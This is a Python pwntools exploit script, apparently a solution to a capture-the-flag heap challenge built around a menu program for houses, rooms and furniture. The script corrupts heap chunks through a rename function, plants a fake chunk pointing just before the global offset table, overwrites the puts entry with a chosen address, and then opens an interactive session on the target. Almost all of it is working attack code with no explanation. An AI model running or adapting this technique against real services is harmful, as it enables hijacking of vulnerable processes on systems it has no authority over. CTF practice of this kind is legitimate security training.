import argparse

from pwn import *

context.terminal = ['kitty']

REMOTE = True

if REMOTE:
    parser = argparse.ArgumentParser()
    parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

    args = parser.parse_args()

    HOST, PORT = args.address.split(':')

    r = remote(HOST, int(PORT))

else:
    r = gdb.debug(
        [   '../challenge/handout/ld-linux-x86-64.so.2',
            '../challenge/handout/challenge',
        ],
        gdbscript="""
    c
    """,
    env= {
        'LD_PRELOAD': '../challenge/handout/libc.so.6',
    })


def add_room(name: bytes, size: int):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'name: ', name)
    r.sendlineafter(b'size: ', str(size).encode('charmap'))

def remove_room(name: bytes):
    r.sendlineafter(b'Choice: ', b'2')
    r.sendlineafter(b'name: ', name)

def add_furniture(room: bytes, name: bytes, size: int):
    r.sendlineafter(b'Choice: ', b'3')
    r.sendlineafter(b'Room name: ', room)
    r.sendlineafter(b'Item name: ', name)
    r.sendlineafter(b'size: ', str(size))

def remove_furniture(room: bytes, name: bytes):
    r.sendlineafter(b'Choice: ', b'4')
    r.sendlineafter(b'Room name: ', room)
    r.sendlineafter(b'Item name: ', name)

def rename_house(name: bytes):
    r.sendlineafter(b'Choice: ', b'6')
    r.sendlineafter(b'House name: ', name)


def change_name(name: bytes):
    r.sendlineafter(b'Choice: ', b'7')
    r.sendlineafter(b'Name: ', name)


r.sendlineafter(b"House name: ", b"DEBUG")
add_room(b'1', 0xbeef) # Just has to be big enough to hold all the furniture
add_furniture(b'1', b'1', 1)
add_furniture(b'1', b'2', 1)
add_furniture(b'1', b'3', 1)
add_furniture(b'1', b'4', 1)
add_furniture(b'1', b'5', 1)

# We have a free chunk of size 32 from the old room furniture array

# Split chunk incorrectly
rename_house(b'\x01'*8)


# Write fake chunk
chunk_pad = b'\x00'*7
chunk_size = b'\x00'*8
chunk_next = p64(0x404765) # pointer to 3 before .got, sets up a free chunk with no next and size 0x7f
rename_house(chunk_pad + chunk_size + chunk_next + b'A'*9)

# pad to overwrite puts entry @ 0x4047a0
change_name(b'A'*35 + p64(0x402625))
r.interactive()
